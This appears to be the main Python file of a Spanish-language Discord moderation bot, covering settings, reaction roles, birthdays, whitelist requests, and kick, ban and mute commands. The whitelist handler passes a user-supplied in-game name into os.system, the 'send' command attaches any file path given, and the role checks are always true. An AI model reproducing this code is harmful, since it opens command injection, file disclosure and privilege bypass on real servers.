import discord
from discord.ext import commands, tasks
import asyncio
from dotenv import load_dotenv
from os import getenv, system
from subprocess import run
import emojis
import cogs.mysql_disc as mysql
from datetime import datetime, timedelta

# EOF IMPORT
load_dotenv()

# INTENTS
intents = discord.Intents.all()

# OPTIONS
prefix = '$'
bot = commands.Bot(command_prefix=prefix, intents=intents)  # <----BOT PREFIX
bot.remove_command('help')  # <----QUITAMOS DEFAULT HELP
author = getenv("AUTHOR")
role_options = ['bot', 'botop', 'mute', 'helper', 'mod', 'admin', 'joinrole']
channel_options = ['mutechannel', 'bday', 'suggest']
feedback_channel = int(getenv("CHANNEL"))

#TASKS
@tasks.loop(hours=24)
async def bdaycheck():
    for guild in bot.guilds:
        try:
            await mysql.bday_check(guild)
        except:
            pass

@bdaycheck.before_loop
async def before_my_task():
    hour = 00
    minute = 1
    await bot.wait_until_ready()
    now = datetime.now()
    future = datetime(now.year, now.month, now.day, hour, minute)
    if now.hour >= hour and now.minute > minute:
        future += timedelta(days=1)
    print(str((future-now).seconds) + ' segundos para cambio de dia')
    await asyncio.sleep((future-now).seconds)

@tasks.loop(hours=2)
async def ping_mysql():
    await mysql.ping()

#CLASES
class DirectMessage(Exception):
    pass

class InsuficientPermissions(Exception):
    pass


# LOGS
@bot.event
async def on_ready():
    print("""
┌————————————————————————————————————————————————————————————————————————————————————————————┐
      ___       __       __
     / _ )___  / /_  ___/ /__
    / _  / _ \/ __/ / _  / -_)
   /____/\___/\__/  \_,_/\__/

       __________  _   __________  ________________  ___    ____  ____  ____  ___________
      / ____/ __ \/ | / / ____/ / / / ____/  _/ __ \/   |  / __ \/ __ \/ __ \/ ____/ ___/
     / /   / / / /  |/ / /_  / / / / / __ / // /_/ / /| | / / / / / / / /_/ / __/  \__ \      
    / /___/ /_/ / /|  / __/ / /_/ / /_/ // // _, _/ ___ |/ /_/ / /_/ / _, _/ /___ ___/ /
    \____/\____/_/ |_/_/    \____/\____/___/_/ |_/_/  |_/_____/\____/_/ |_/_____//____/

└————————————————————————————————————————————————————————————————————————————————————————————┘
                       _    _     _
 /|,/_   _/_   /_     /_)-// `/_// /
/  //_|/_//_' /_//_/ /_) //_,/ //_/
                 _/""")
    print("""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ✠ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
    bdaycheck.start()
    ping_mysql.start()
    bot.load_extension("cogs.images")
    for server in bot.guilds:
        await mysql.settings_update(server.name)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers | Usa $help "))

# EVENTS
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound) or isinstance(error, commands.CheckFailure):
        return
    elif isinstance(error, commands.errors.MemberNotFound):
        em = discord.Embed(title=f'Unknown user',description=f'No se ha podido encontrar al usuario.',color=16711680)
        await ctx.send(embed=em)
    elif isinstance(error, discord.errors.Forbidden):
        em = discord.Embed(title='Insuficient permissions',
                           description=f'No tengo permisos suficientes para eso.',
                           color=16711680)
        await ctx.send(embed=em)
    else:
        print(error)
        raise error

@bot.event
async def on_member_join(member):
    if member.bot is True:
        try:
            await member.guild.system_channel.send(f'Se ha unido el bot {member.mention}')
        except:
            pass
        if await mysql.settings_val(member.guild, 'bot_role') == 'False':
            botop=await member.guild.create_role(name='Bot-ArmῨ', colour=discord.Colour(0x00FF80), permissions=discord.permissions(8))
            botrole=await member.guild.create_role(name='Bot-ArmῨ', colour=discord.Colour(0x2f3136),permissions=discord.permissions(0), hoist=True)
        else:
            botrole= member.guild.get_role(int(await mysql.settings_val(member.guild, 'bot')))
        await member.add_roles(botrole)
    else:
        try:
            await member.guild.system_channel.send(f'Bienvenido {member.mention} a {member.guild}')
            roleid=await mysql.settings_val(member.guild, "joinrole")
            if str(roleid) != "Default":
                role=member.guild.get_role(int(roleid))
                await member.add_roles(role)
            else:
                pass
        except:
            pass

@bot.event
async def on_member_remove(member):
    if member.bot is True:
        try:
            await member.guild.system_channel.send(f'Se ha ido el bot {member}')
        except:
            pass
    else:
        try:
            await member.guild.system_channel.send(f'Una pena que {member} se haya marchado.')
        except:
            pass

@bot.event
async def on_guild_join(guild):
    print(f'- [JOIN] El bot ha entrado en {guild}')
    await mysql.settings(guild)

@bot.event
async def on_guild_remove(guild):
    print(f'- [LEFT] El bot ha abandonado {guild}')
    await mysql.bot_rem(guild)

@bot.event
async def on_raw_reaction_add(payload: discord.RawReactionActionEvent):
    try:
        reactor = payload.member
        if not reactor.bot:
            channel = bot.get_channel(payload.channel_id)
            message = await channel.fetch_message(payload.message_id)
            emoji = payload.emoji.name
            reactor = payload.member
            if str(emoji) == '📌':
                if reactor == reactor.guild.owner:
                    pass
                else:
                    modid=await mysql.settings_val(reactor.guild, "mod")
                    adminid = await mysql.settings_val(reactor.guild, "admin")
                    if reactor.guild.get_role(int(modid)) in reactor.roles or reactor.guild.get_role(int(adminid)) in reactor.roles:
                        pass
                    else:
                        return
                await message.pin()
                await channel.purge(limit=1)
                await message.remove_reaction('📌', member=reactor)
            elif str(emoji) == '✂️':
                if reactor.guild_permissions.manage_messages:
                    await message.unpin()
                    await message.remove_reaction('✂️', member=reactor)
            elif str(emoji) == '📝':
                await message.remove_reaction('📝', member=reactor)
                await message.add_reaction('✅')
                await message.add_reaction('❎')
            elif str(emoji) == '✅' or str(emoji) == '❎':
                if str(channel.id) == str(await mysql.settings_val(message.guild, "whitelist")) and str(message.author.id) == str(bot.user.id):
                    server=message.embeds[0].fields[2].value
                    user=message.embeds[0].fields[0].value
                    duser = message.embeds[0].title[13:]
                    if str(emoji) == '❎':
                        await message.delete()
                    elif str(emoji) == '✅':
                        comando=(await mysql.check(message.guild, server, "whitelist", "command", "server_name")).replace("&", "^M").replace("$user", str(user))
                        print(f'[WL] {server} - {user}({duser})')
                        em = discord.Embed(title="Whitelist aprobada",
                                                   description="Enhorabuena!! Has sido aceptado en " + server, color=5763719)
                        await message.guild.get_member_named(message.embeds[0].title[13:]).send(embed=em)
                        system(comando)
                        await message.delete()
                        em = discord.Embed(title="Whitelist aprobada",
                                                   description="El usuario " + reactor.name + " ha aceptado a " + user + " en " + server)
                        await channel.send(embed=em)
                return
            else:
                emoji = emojis.decode(emoji)
                comp = await mysql.react_checkmsg(message.guild, message.id, "reactmsg")
                if comp is True:
                    role_id = await mysql.check(message.guild, emoji, "reactions", "role_id")
                    try:
                        role = message.guild.get_role(int(role_id))
                        await reactor.add_roles(role)
                        try:
                            joinrole = reactor.guild.get_role(int(await mysql.settings_val(reactor.guild, "joinrole")))
                            if joinrole is None:
                                pass
                            else:
                               await reactor.remove_roles(joinrole)
                        except:
                            pass
                    except:
                        return
                else:
                    comp = await mysql.react_checkmsg(message.guild, message.id, "whitelistmsg")
                    if comp is True:
                        server = await mysql.check(message.guild, emoji, "whitelist", "server_name")
                        try:
                            comp2=None
                            while comp2 is None:
                                em = discord.Embed(title="Whitelist pendiente",
                                                   description="Hola! Para solicitar tu entrada en el servidor necesito que me digas tu nombre ingame")
                                await reactor.send(embed=em)
                                msg = await bot.wait_for('message', check=lambda message: message.author == reactor)
                                username=msg.content
                                if username is None:
                                    em = discord.Embed(title="Whitelist pendiente",
                                                       description="Tu nombre no puede estar vacio, porfavor, intentalo de nuevo")
                                    await reactor.send(embed=em)
                                else:
                                    em = discord.Embed(title="Whitelist pendiente",
                                                       description="Escribe CORRECTO si tu nombre ingame es " + username)
                                    await reactor.send(embed=em)
                                    msg2 = await bot.wait_for('message', check=lambda message: message.author == reactor)
                                    if msg2.content == "CORRECTO":
                                        em = discord.Embed(title="Whitelist pendiente", description="Añade una breve presentacion o cuentanos por que quieres unirte al servidor y habrás terminado!!")
                                        await reactor.send(embed=em)
                                        msg3 = await bot.wait_for('message', check=lambda message: message.author == reactor)
                                        em = discord.Embed(title="Whitelist pendiente",
                                                           description="Se ha enviado tu solicitud a los moderadores!", color=5763719)
                                        await reactor.send(embed=em)
                                        whitelist_channel_id=await mysql.settings_val(message.guild, "whitelist")
                                        try:
                                            whitelist_channel=message.guild.get_channel(int(whitelist_channel_id))
                                            if whitelist_channel is None:
                                                raise Exception
                                        except:
                                            whitelist_channel=await message.guild.create_text_channel(name="Whitelists")
                                            await mysql.settings_set(message, message.guild, "whitelist", whitelist_channel.id, None)
                                        comp2=True
                            em = discord.Embed(title="Solicitud de " + reactor.name + "#" +  str(reactor.discriminator), description="El siguiente usuario ha solicitado entrar en un servidor")
                            em.add_field(name="Usuario", value=username)
                            em.add_field(name="Postulacion", value=msg3.content)
                            em.add_field(name="Servidor", value=server)
                            msg=await whitelist_channel.send(embed=em)
                            await msg.add_reaction('✅')
                            await msg.add_reaction('❎')
                        except:
                            return
                    else:
                        pass
        else:
            return
    except AttributeError:
        pass

#CHECKS
def dms():
    async def predicate(ctx):
        try:
            if str(ctx.channel.type) == 'private' or str(ctx.channel.type) == 'group':
                raise DirectMessage
            else:
                return True
        except DirectMessage:
            await ctx.send('Los comandos solo están disponibles en el chat del servidor.')
    return commands.check(predicate)


def owner_or_admin():
    async def predicate(ctx):
        try:
            oproles = await mysql.settings_role(ctx, ctx.guild)
            if str(ctx.author.id) == str(ctx.guild.owner.id):
                return True
            else:
                oproles=oproles[2]
                try:
                    admin=ctx.guild.get_role(int(oproles))
                    if admin in ctx.author.roles:
                        return True
                    else:
                        raise InsuficientPermissions
                except ValueError:
                    raise InsuficientPermissions
        except InsuficientPermissions:
            em = discord.Embed(title='Insuficient permissions',description='No tienes los permisos suficientes para ejecutar ese comando.',color=16711680)
            await ctx.send(embed=em)
    return commands.check(predicate)

def mod_or_higher():
    async def predicate(ctx):
        try:
            oproles = await mysql.settings_role(ctx, ctx.guild)
            if str(ctx.author.id) == str(ctx.guild.owner.id):
                return True
            else:
                try:
                    admin=ctx.guild.get_role(int(oproles[2]))
                except:
                    pass
                try:
                    mod=ctx.guild.get_role(int(oproles[1]))
                except:
                    pass
                if admin or mod in ctx.author.roles:
                    return True
                else:
                    raise InsuficientPermissions
        except InsuficientPermissions:
            em = discord.Embed(title='Insuficient permissions',description='No tienes los permisos suficientes para ejecutar ese comando.',color=16711680)
            await ctx.send(embed=em)
    return commands.check(predicate)

def helper_or_higher():
    async def predicate(ctx):
        try:
            oproles = await mysql.settings_role(ctx, ctx.guild)
            if str(ctx.author.id) == str(ctx.guild.owner.id):
                return True
            else:
                try:
                    admin=ctx.guild.get_role(int(oproles[2]))
                    mod=ctx.guild.get_role(int(oproles[1]))
                    helper = ctx.guild.get_role(int(oproles[0]))
                    if admin or mod or helper in ctx.author.roles:
                        return True
                    else:
                        raise InsuficientPermissions
                except ValueError:
                    raise InsuficientPermissions
        except InsuficientPermissions:
            em = discord.Embed(title='Insuficient permissions',description='No tienes los permisos suficientes para ejecutar ese comando.',color=16711680)
            await ctx.send(embed=em)
    return commands.check(predicate)

# COMMANDS
# ◤━━━━━━━━━━━━━━━━━━━━°•AJUSTES•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['ajustes'])
@dms()
@owner_or_admin()
async def settings(ctx, opt=None, newval=None):
        if opt is None:
            em = discord.Embed(title='Insuficient arguments',description='No has facilitado ninguna opción, usa `$settings <opcion>` para consultar su valor o `$help settings` para visualizar las opciones.',color=16711680)
            await ctx.send(embed=em)
        elif opt == 'update':
            await mysql.settings_update(ctx.guild)
            em = discord.Embed(title='Se han actualizado los ajustes',description='Se han actualizado los ajustes en este servidor, usa $settings list para verlos',color=5763719)
            await ctx.send(embed=em)
        elif opt == 'list':
            arr=await mysql.settings_list(ctx, ctx.guild)
            em=discord.Embed(title='Opciones',description='Usa `$reaction edit <opt>` para cambiar cualquiera de las opciones:', color=5763719)
            for entry in arr:
                narr=str(entry).split(":")
                em.add_field(name=f'_{narr[0]}_', value=f'{narr[1]}.',inline=False)
            await ctx.send(embed=em)
        else:
            if newval is None:
                query=await mysql.settings_val(ctx.guild, opt)
                if opt in role_options:
                     try:
                        role_name= ctx.guild.get_role(int(query))
                     except:
                         query='Default'
                else:
                    pass
                if query is None:
                    em = discord.Embed(title='Invalid option',description=f'La opción {opt} no existe, usa `$help settings` para ver las opciones disponibles.',color=16711680)
                    await ctx.send(embed=em)
                elif query == 'Default':
                    em = discord.Embed(title=f'El valor de {opt} es _{query}_',description=f'Este es el valor por defecto, si es una función indica que está desactivada, utiliza `$settings {opt} <valor>` para cambiarlo.',color=5763719)
                    await ctx.send(embed=em)
                else:
                    em = discord.Embed(title=f'El valor de {opt} es _{query}_',description=f'Utiliza `$settings {opt} <valor>` para cambiarlo.',color=5763719)
                    await ctx.send(embed=em)
            else:
                if newval == 'Default' or newval == 'False':
                    newval='False'
                    role_name=None
                else:
                    if opt in role_options:
                        try:
                            newval=newval[3:-1]
                            role=ctx.guild.get_role(int(newval))
                            role_name = role.name
                        except ValueError:
                            em = discord.Embed(title='Invalid value',description=f'Los valores que acepta _{opt}_ son roles, para ello etiqueta el rol.',color=16711680)
                            await ctx.send(embed=em)
                            return
                    elif opt in channel_options:
                        try:
                            newval=newval[2:-1]
                            channel=ctx.guild.get_channel(int(newval))
                            role_name=channel.name
                        except:
                            em = discord.Embed(title='Invalid value',description=f'{opt} solo acepta canales, para seleccionar un canal usa `#<canal>`.',color=16711680)
                            await ctx.send(embed=em)
                            return
                    else:
                        role_name=None
                query=await mysql.settings_set(ctx, ctx.guild, opt, newval, role_name)
                if query is None:
                    em = discord.Embed(title='Invalid Option',description='Tienes que elegir que opcion cambiar, para ver las opciones disponibles usa `$help settings`',color=16711680)
                    await ctx.send(embed=em)
                else:
                    em = discord.Embed(title='Value updated',description=f'Se ha actualizado el valor de _{query[0]}_ a _{query[1]}_ correctamente.',color=5763719)
                    await ctx.send(embed=em)

# ◤━━━━━━━━━━━━━━━━━━━━°•RENAME•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['rename', 'ren', 'alias'])
@dms()
async def nick(ctx, nick_name, member = None):
    try:
        member = await ctx.guild.fetch_member(int(member[2:-1]))
        if ctx.author.guild_permissions.manage_nicknames:
            if member is None:
                await ctx.author.edit(nick=nick_name)
            else:
                await member.edit(nick=nick_name)
        else:
            if member == ctx.author:
                await ctx.author.edit(nick=nick_name)
                em = discord.Embed(title='Nick updated',description='Se ha cambiado el apodo correctamente.',color=5763719)
                await ctx.send(embed=em)
            else:
                em = discord.Embed(title='Insuficient permissions', description=f'No tienes permisos suficientes para cambiarle el nick a {member}.',color=16711680)
                await ctx.send(embed=em)
    except:
        em = discord.Embed(title='Error in command',
                           description=f'Necesitas introducir como minimo tu nuevo nick $nick "<nuevo_nick>" [usuario].',
                           color=16711680)
        await ctx.send(embed=em)


# ◤━━━━━━━━━━━━━━━━━━━━°•PING•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
async def ping(ctx):
    await ctx.send(f'Latencia --> {round(bot.latency * 1000)}ms')

# ◤━━━━━━━━━━━━━━━━━━━━°•SAY•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['di'])
@dms()
@mod_or_higher()
async def say(ctx, title, description=None):
    if description is None:
        em = discord.Embed(title="Insuficient Arguments", description="Introduce una descripccion valida, $say <title> <descripción>", color=16711680)
        await ctx.send(embed=em)
    else:
        try:
            em = discord.Embed(title=title,description=description,color=16711680)
            await ctx.channel.purge(limit=1)
            await ctx.send(embed=em)
        except:
            pass

# ◤━━━━━━━━━━━━━━━━━━━━°•SEND•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
@mod_or_higher()
async def send(ctx, route=None):
    if route is None:
        em = discord.Embed(title="Insuficient Arguments", description="Introduce una descripccion valida, $send <route>", color=16711680)
    else:
        try:
            await ctx.send(file=discord.File(route))
        except:
            pass
# ◤━━━━━━━━━━━━━━━━━━━━°•FORCE•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
async def recon(ctx):
    if str(ctx.author) == author:
        await mysql.reconnect()
        print('- [RECONNECT] Forced')
    else:
        pass

# ◤━━━━━━━━━━━━━━━━━━━━°•PREFIXES•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['prefijos'])
@dms()
@owner_or_admin()
async def preffixes(ctx):
    try:
        embed=discord.Embed(title="Prefijos de los bots", description="En este mensaje hay una breve descripción de las funciones de cada bot junto con su prefijo", color=0xff0000)
        embed.add_field(name="Confugiradores [ $ ]", value="Este bot incluye diversas funciones de moderación y gestion.", inline=False)
        embed.add_field(name="Dank Memer [ pls ]", value="Este bot da memes así como imagenes, apuestas, entre otros.", inline=False)
        embed.add_field(name="KDBot [ ' ] ", value="Este bot hace text to speech.", inline=False)
        embed.add_field(name="Node [ . ]", value="Este bot se utiliza para ver videos en youtube o jugar juegos flash de forma conjunta.", inline=False)
        embed.add_field(name="Poketwo [ p! ]", value="Este bot permite capturar, combatir y cambiar pokemons.", inline=False)
        embed.add_field(name="Redditcord [ r! ]", value="Este bot envia publicaciones de reddit.", inline=False)
        await ctx.send(embed=embed)
    except:
        pass

# ◤━━━━━━━━━━━━━━━━━━━━°•SUGGEST•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
async def suggest(ctx, desc=None, excess=None):
    await ctx.channel.purge(limit=1)
    if desc is None:
        em = discord.Embed(title='Insuficient arguments',description=f'No has facilitado ninguna sugerencia usa $suggest <sugerencia>',color=16711680)
        await ctx.send(embed=em)
    else:
        if excess is not None:
            em = discord.Embed(title='Invalid value',description=f'Debes introducir la descripción entre comillas, por ejemplo $suggest "esto es un ejemplo de la sugerencia"',color=16711680)
            await ctx.send(embed=em)
        else:
            try:
                query=await mysql.settings_val(ctx.guild, "suggest")
                if query == "Default":
                    suggestchanid = await ctx.guild.create_text_channel("sugerencias")
                    await mysql.settings_set(ctx, ctx.guild, "suggest", suggestchanid.id, None)
                else:
                    suggestchanid = query
                suggestchan = bot.get_channel(int(suggestchanid))
                em = discord.Embed(title=f"Sugerencia de {ctx.author}",description=desc,color=0x5925a7)
                message = await suggestchan.send(embed=em)
                await message.add_reaction('✅')
                await message.add_reaction('❎')
            except:
                pass

# ◤━━━━━━━━━━━━━━━━━━━━°•CLEAR•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['cls','clean'])
@dms()
@owner_or_admin()
async def clear(ctx, amount=1):
    try:
        await ctx.channel.purge(limit=amount + 1)
    except:
        pass

# ◤━━━━━━━━━━━━━━━━━━━°•INVITE•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['invitacion','invitar'])
@dms()
async def invite(ctx):
    invite_d = await ctx.channel.create_invite(destination=ctx.channel, max_age=int(0), max_uses=int(0))
    await ctx.channel.purge(limit=1)
    await ctx.author.send('Aqui tienes tu invitacion!! -->' + str(invite_d))
# ◤━━━━━━━━━━━━━━━━━━━°•CUMPLE•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['bday'])
@dms()
async def cumple(ctx, opt=None, day=None, month=None):
    if opt == 'set' or opt == 'edit':
        try:
            day = int(day)
            if day > 31 or day < 1:
                raise Exception('No')
            else:
                pass
        except:
            em = discord.Embed(title='Invalid value',description=f'Debes introducir un numero de maximo dos cifras y no superior a 31, {day}, no cumple esos requisitos.',color=16711680)
            await ctx.send(embed=em)
            return
        try:
            month = int(month)
            if month > 12 or month < 1:
                raise Exception('no')
            else:
                pass
        except:
            em = discord.Embed(title='Invalid value',description=f'Debes introducir un numero de maximo dos cifras y no superior a 12, {month}, no cumple esos requisitos.',color=16711680)
            await ctx.send(embed=em)
            return
        date = str(day) + '/' + str(month)
        result = await mysql.bday(ctx, ctx.guild, ctx.author.id, opt, date)
        if result is None:
            em = discord.Embed(title='Invalid value',description=f'Debes introducir un numero de maximo dos cifras y no superior a 12, {month}, no cumple esos requisitos.',color=16711680)
            await ctx.send(embed=em)
        elif result == "already":
            em = discord.Embed(title='Error', description='Ya tienes una fecha de cumpleaños asignada, para editarla usar $cumple edit <dia> <mes>.', color=16711680)
            await ctx.send(embed=em)
        elif opt == "edit":
            em = discord.Embed(title='Value updated',description=f'He cambiado tu cumpleaños de {result[0]} a {result[1]}.',color=5763719)
            await ctx.send(embed=em)
        else:
            em = discord.Embed(title='Value updated',description=f'He apuntado tu cumple el {result}.',color=5763719)
            await ctx.send(embed=em)
    elif opt == 'remove' or opt == 'check':
        result = await mysql.bday(ctx, ctx.guild, ctx.author.id, opt)
        if opt == "remove":
            if result is None:
                em = discord.Embed(title='Error',description='No tengo apuntado tu cumpleaños, usa $cumple set <dia> <mes>.', color=16711680)
                await ctx.send(embed=em)
            else:
                em = discord.Embed(title='Value updated', description='He borrado tu cumple correctamente.', color=5763719)
                await ctx.send(embed=em)
        else:
            if result is None:
                em = discord.Embed(title='Error',description='No tengo apuntado tu cumpleaños, usa $cumple set <dia> <mes>.', color=16711680)
                await ctx.send(embed=em)
            else:
                em = discord.Embed(title='Value updated', description=f'Tengo apuntado que tu cumple es {result}.', color=5763719)
                await ctx.send(embed=em)
    else:
        em = discord.Embed(title='Invalid option',description='Debes introducir una opcion valida, para ver las opciones usa $help cumple.',color=16711680)
        await ctx.send(embed=em)

# ◤━━━━━━━━━━━━━━━━━━°•REACTION•°━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['reactions', 'reaccion' , 'react'])
@dms()
@owner_or_admin()
async def reaction(ctx, opt=None, role=None, role_emoji=None, role_description=None, role_name=None):
    if opt == 'create':
        result = await mysql.create(ctx.guild, 'reactions', 'role_id ', 'emoji', 'role_name', 'role_description', None)
        if result is None:
            em = discord.Embed(title='Task failed',description='No puedes crear la tabla porque ya existe.',color=16711680)
            await ctx.send(embed=em)
        else:
            em = discord.Embed(title='Table created', description='Se ha creado la tabla correctamente.', color=5763719)
            await ctx.send(embed=em)
    elif opt == 'setup':
        await ctx.channel.purge(limit=1)
        message = role
        message_id = await mysql.react_setup(ctx,str(ctx.guild), message)
        if message_id is None:
            pass
        else:
            try:
                msg = await ctx.fetch_message(message_id)
                await msg.delete()
            except:
                pass
    elif opt == 'add':
        if (role, role_emoji) is None:
            return
        elif role_emoji == '📌' or role_emoji == '✂️' or role_emoji == '📝' or role_emoji == '✅' or role_emoji == '❎':
            em = discord.Embed(title=f'Invalid value',description=f'No se puede utilizar el emoji {role_emoji}.',color=16711680)
            em.add_field(name='Emojis inválidos', value='📌, ✂️, 📝, ✅, ❎')
            await ctx.send(embed=em)
            return
        else:
            try:
                role_id = int(role[3:-1])
            except:
                em = discord.Embed(title=f'Invalid value', description=f'{role} no es un rol valido.',color=16711680)
                await ctx.send(embed=em)
                return
            if ctx.guild.get_role(role_id):
                if emojis.count(role_emoji) != 0:
                    role_emoji = emojis.decode(role_emoji)
                    if role_name is None:
                        role_name = ctx.guild.get_role(role_id).name
                    else:
                        pass
                    if role_description is None:
                            role_description = 'Sin descripción.'
                    else:
                        pass
                    await mysql.react_add(ctx, str(ctx.guild), role_id, role_emoji, role_name, role_description)
                else:
                    em = discord.Embed(title=f'Invalid value', description=f'{role_emoji} no es un emoji valido.',color=16711680)
                    await ctx.send(embed=em)
                    return
            else:
                em = discord.Embed(title=f'Invalid value', description=f'{role} no es un rol valido.', color=16711680)
                await ctx.send(embed=em)
                return
    elif opt == 'list':
        await mysql.react_list(ctx, str(ctx.guild))
    elif opt == 'remove':
        if role is None:
            pass
        else:
            try:
                await mysql.react_del(ctx, str(ctx.guild), role)
            except:
                pass
    elif opt == 'edit':
        option = role
        value = role_description
        if role is None:
            embed = discord.Embed(title=f'Debes introducir una opción', description='Usa `$reaction edit <opt>` con una de las siguientes opciones:', color=16711680)
            embed.add_field(name='_emoji_', value='Edita el emoji asignado al rol.')
            embed.add_field(name='_alias, name_', value='Cambia o añade el alias del rol.')
            embed.add_field(name='_description_', value='Cambia o añade una descripción al rol.')
            await ctx.send(embed=embed)
            return
        else:
            pass
        try:
            role = int(role_emoji[3:-1])
        except:
            role = role_emoji
            role_id=await mysql.react_name(ctx, role)
            if role_id:
                role=role_id
            else:
                em = discord.Embed(title=f'Invalid value', description=f'{role} no es un rol valido, comprueba que lo has escrito bien o etiquetalo con `@rol`', color=16711680)
                await ctx.send(embed=em)
                return
        if option == 'emoji':
            if emojis.count(value) != 0:
                if value == '📌' or value == '✂️' or value == '📝' or value == '✅' or value == '❎':
                    em = discord.Embed(title=f'Invalid value',description=f'No se puede utilizar el emoji {role_emoji}.', color=16711680)
                    em.add_field(name='Invalid emoji', value='📌, ✂️, 📝, ✅, ❎')
                    await ctx.send(embed=em)
                    return
                else:
                    value = emojis.decode(value)
                    await mysql.react_update(ctx, 'emoji', role, value)
            else:
                em = discord.Embed(title=f'Invalid value', description=f'{value} no es un emoji válido, recuerda que la sintaxis para editar es `$reaction edit <opción> <rol> <valor>`',color=16711680)
                await ctx.send(embed=em)
                return
        elif option == 'alias' or option == 'name':
            if role_name is not None:
                em = discord.Embed(title=f'Invalid value',description=f'Para introducir más de una palabra debes introducirlo entre comillas "ejemplo".',color=16711680)
                await ctx.send(embed=em)
                return
            else:
                await mysql.react_update(ctx, 'name', role, value)
        elif option == 'description':
            if role_name is not None:
                em = discord.Embed(title=f'Invalid value',description=f'Para introducir más de una palabra debes introducirlo entre comillas "ejemplo".',color=16711680)
                await ctx.send(embed=em)
                return
            else:
                await mysql.react_update(ctx, 'description', role, value)
        else:
            embed= discord.Embed(title='Invalid option', description=f'{option} no es una opción valida, usa `$reaction edit <opt>` con una de las siguientes opciones:', color=16711680)
            embed.add_field(name='_emoji_', value='Edita el emoji asignado al rol.')
            embed.add_field(name='_alias, name_', value='Cambia o añade el alias del rol.')
            embed.add_field(name='_description_', value='Cambia o añade una descripción al rol.')
            await ctx.send(embed=embed)
    else:
        embed= discord.Embed(title='Invalid option', description=f'{opt} no es una opción valida, utiliza cualquiera de las siguientes opciones:', color=16711680)
        embed.add_field(name='_create_', value='Para crear una entrada en la base de datos en caso de que no existiese.')
        embed.add_field(name='_setup_', value='Para enviar de nuevo el mensaje con todos los roles.')
        embed.add_field(name='_add_', value='Para añadir un nuevo rol.')
        embed.add_field(name='_remove_', value='Para eliminar un rol de la selección.')
        await ctx.send(embed=embed)

# ◤━━━━━━━━━━━━━━━━━━━━━°•KICK•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
@mod_or_higher()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    if str(member) == author:
        em = discord.Embed(title=f'Wowowowowow', description=f'Ande vas capi? pretendes expulsar a mi creador?.',color=16711680)
        await ctx.send(embed=em)
    else:
        try:
            await ctx.send(member.name + 'ha sido kickeado.')
            await member.kick(reason=reason)
        except:
            em = discord.Embed(title=f'Invalid member', description=f'{member} no es un miembro valido, para expulsar a alguien tienes que mencionarlo.',color=16711680)
            await ctx.send(embed=em)

# ◤━━━━━━━━━━━━━━━━━━━━━°•BAN•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['slay'])
@dms()
@owner_or_admin()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    try:
        if str(member) == author:
            await ctx.send('Ande vas capitán, deja al B1CH0 en paz')
        else:
            if reason is None:
                em = discord.Embed(title=f'Member banned',description=f'{member.name} ha sido baneado.',color=16711680)
                await ctx.send(embed=em)
            else:
                em = discord.Embed(title=f'Member banned', description=f'{member.name} ha sido baneado por: {reason}.',color=16711680)
                await ctx.send(embed=em)
            await member.ban(reason=reason)
    except:
        await ctx.channel.purge(limit=1)
        await ctx.author.send('No tienes permiso para banear a nadie.')

# ◤━━━━━━━━━━━━━━━━━━━━━°•MUTE•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
@helper_or_higher()
async def mute(ctx, member: discord.Member=None, time=5):
    #try:
    mute_role=await mysql.settings_val(ctx.guild, 'mute')
    if str(mute_role) == 'Default':
        muter = await ctx.guild.create_role(name='muted', color=0x607d8b, hoist=True)
        muter_id = muter.id
        await mysql.settings_set(ctx, ctx.guild, 'mute', str(muter_id), None)
    else:
        try:
            muter = ctx.guild.get_role(int(mute_role))
            muter_id = muter.id
        except:
            muter = await ctx.guild.create_role(name='muted', color=0x607d8b, hoist=True)
            muter_id = muter.id
            await mysql.settings_set(ctx, ctx.guild, 'mute', str(muter_id), None)
    mute_channel=await mysql.settings_val(ctx.guild, 'mutechannel')
    if mute_channel == 'Default':
        channelr=await ctx.guild.create_text_channel(name='pov-has-sido-muteado')
        channelr_id = channelr.id
        await mysql.settings_set(ctx, ctx.guild, 'mutechannel', str(channelr_id), None)
        overwrite = discord.PermissionOverwrite()
        overwrite.send_messages = False
        overwrite.read_messages = True
        await channelr.set_permissions(muter, overwrite=overwrite)
        overwrite.read_messages = False
        everyone_role=discord.utils.get(ctx.guild.roles, name='@everyone')
        await channelr.set_permissions(everyone_role, overwrite=overwrite)
    else:
        try:
            channelr=ctx.guild.get_channel(int(mute_channel))
            channelr_id = channelr.id
        except:
            channelr = await ctx.guild.create_text_channel(name='pov-has-sido-muteado')
            channelr_id = channelr.id
            await mysql.settings_set(ctx, ctx.guild, 'mutechannel', str(channelr_id), None)
    em = discord.Embed(title=f'You have been muted', description=f'Has sido muteado de {ctx.guild.name} por {str(time)} segundos.',
                       color=16711680)
    await member.send(embed=em)
    await member.add_roles(muter)
    await member.edit(mute=True)
    await asyncio.sleep(int(time))
    try:
        if muter in member.roles:
            em = discord.Embed(title=f'You have been unmuted',
                               description=f'Has sido desmuteado de {ctx.guild.name}.',
                               color=5763719)
            await member.send(embed=em)
            await member.edit(mute=False)
            await member.remove_roles(muter)
    except:
        pass
    # except:
    #     pass

